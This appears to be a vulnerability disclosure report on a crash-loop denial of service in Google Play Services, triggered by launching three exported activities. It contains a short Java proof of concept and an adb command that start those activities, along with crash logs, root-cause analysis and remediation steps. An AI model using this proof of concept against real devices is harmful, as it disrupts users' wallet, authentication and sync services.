# VRP Report: GMS Exported Activity Crash-Loop Denial of Service

## 1. Vulnerability Title
Zero-Permission App Crashes Google Play Services via Exported Activities — Persistent DoS Until User Intervention

## 2. Affected Application
- **Package**: com.google.android.gms (Google Play Services)
- **VRP Tier**: Tier 1 (Google Play Services)
- **Version**: GMS 26.32.68 (260400-975269223), tested 2026-09-05
- **Device**: Pixel 6a, Android 17 (API 37), Build CP2A.260605.012

## 3. Affected Components

| Activity | Crash Type | Restarts |
|----------|-----------|----------|
| `com.google.android.gms.wallet.ImRootActivity` | RuntimeException in ImRootChimeraActivity.onCreate | 7+ |
| `com.google.android.gms.auth.login.DeepLinkEntryPointActivity` | RuntimeException in DeepLinkChimeraActivity.onCreate | 5+ |
| `com.google.android.gms.auth.login.AssistedSignInActivity` | SuperNotCalledException | 1 (immediate ANR) |

## 4. Vulnerability Type
- **CWE-248**: Uncaught Exception
- **CWE-400**: Uncontrolled Resource Consumption
- **Mobile VRP Category**: Availability Impact / Denial of Service

## 5. Severity Assessment
- **Impact**: HIGH — GMS hosts Google Wallet, authentication, sync, and 100+ device services
- **Attack Complexity**: LOW — Single `am start` from any app
- **User Interaction**: NONE
- **Duration**: Persistent until user dismisses "isn't responding" dialog

## 6. Vulnerability Description

Three exported activities in GMS crash immediately when launched by any third-party app. These activities use the Chimera dynamic module-loading framework, which throws a RuntimeException in `onCreate()` when required Chimera initialization data is missing from the launching intent.

Each crash triggers Android's process restart mechanism. Because GMS is a persistent system service, Android immediately restarts it — but the crashed activity is also restored, causing another crash. This creates a **crash-restart loop** that:
1. Spawns 5-7+ new GMS processes in rapid succession
2. Triggers the system "Google Play services isn't responding" dialog
3. Disrupts ALL GMS-dependent services (Wallet, Auth, Sync, Location, Firebase, etc.)
4. Persists until the user manually dismisses the ANR dialog

## 7. Proven Impact — Dynamic Evidence

### 7.1 Crash-Loop Logcat

**ImRootActivity (7+ crashes):**
```
AndroidRuntime: FATAL EXCEPTION: main
AndroidRuntime: java.lang.RuntimeException: Unable to start activity
    ComponentInfo{com.google.android.gms/com.google.android.gms.wallet.ImRootActivity}:
    java.lang.RuntimeException
    at com.google.android.chimera.container.impl.activity.ChimeraActivityDelegateImplV2.onCreate
    at com.google.android.gms.wallet.ImRootChimeraActivity.onCreate
```

**DeepLinkEntryPointActivity (5+ crashes):**
```
AndroidRuntime: FATAL EXCEPTION: main
AndroidRuntime: java.lang.RuntimeException: Unable to start activity
    ComponentInfo{com.google.android.gms/com.google.android.gms.auth.login.DeepLinkEntryPointActivity}:
    java.lang.RuntimeException
    at com.google.android.chimera.container.impl.activity.ChimeraActivityDelegateImplV2.onCreate
    at com.google.android.gms.auth.login.DeepLinkChimeraActivity.onCreate
```

**AssistedSignInActivity (ANR):**
```
AndroidRuntime: FATAL EXCEPTION: main
AndroidRuntime: android.util.SuperNotCalledException:
    Activity {com.google.android.gms/com.google.android.gms.auth.login.AssistedSignInActivity}
    did not call through to super.onCreate()
```

### 7.2 System ANR Dialog — Screenshot Evidence

File: `/Users/sandiyochristan/Documents/vulnerabilityRes/logs/vrp_gms_crash_dos_proof.png`

Screenshot shows: **"Google Play services isn't responding"** system dialog with "Close app" and "Wait" options. This dialog appeared after the crash-loop spawned multiple GMS processes.

### 7.3 Process Multiplication

During the crash-loop, `ps -A | grep gms` showed 5-7 concurrent GMS processes being spawned and killed:
```
u0_a266  30341 ...  com.google.android.gms
u0_a266  30355 ...  com.google.android.gms
u0_a266  30401 ...  com.google.android.gms
u0_a266  30455 ...  com.google.android.gms
u0_a266  30512 ...  com.google.android.gms
```

## 8. Proof of Concept

```java
// Zero-permission app triggers GMS crash-loop
private void testGmsCrashDoS() {
    // Any of these three will crash GMS:
    // 1. Wallet
    Intent wallet = new Intent();
    wallet.setClassName("com.google.android.gms",
        "com.google.android.gms.wallet.ImRootActivity");
    startActivity(wallet);

    // 2. DeepLink Auth
    Intent deeplink = new Intent();
    deeplink.setClassName("com.google.android.gms",
        "com.google.android.gms.auth.login.DeepLinkEntryPointActivity");
    startActivity(deeplink);

    // 3. Assisted Sign-In
    Intent signIn = new Intent();
    signIn.setClassName("com.google.android.gms",
        "com.google.android.gms.auth.login.AssistedSignInActivity");
    startActivity(signIn);
}
```

**ADB Reproduction:**
```bash
adb shell am start -n com.google.android.gms/.wallet.ImRootActivity
# Immediate crash, followed by 5-7 restart attempts
# System dialog: "Google Play services isn't responding"
```

## 9. Root Cause

These activities are `exported=true` in the manifest but require Chimera module initialization data in their launching intent. When launched with an empty intent:
1. `ChimeraActivityDelegateImplV2.onCreate()` fails to find required module config
2. Throws `RuntimeException` before the activity can display UI
3. Android's `ActivityThread` catches the exception and reports a crash
4. GMS's `persistent` attribute causes immediate process restart
5. The activity restoration mechanism restores the crashed activity, causing another crash

## 10. Remediation

1. Add input validation in Chimera activity delegates — finish gracefully if required data is missing
2. Remove `exported=true` from activities that require internal-only Chimera initialization
3. Add `android:permission` to exported activities that should only be launched by Google apps
4. Implement crash-loop circuit breaker to prevent unlimited restarts

## 11. Test Device
- Google Pixel 6a (bluejay)
- Android 17 (API 37)
- Build CP2A.260605.012
- GMS version: 26.32.68 (260400-975269223)
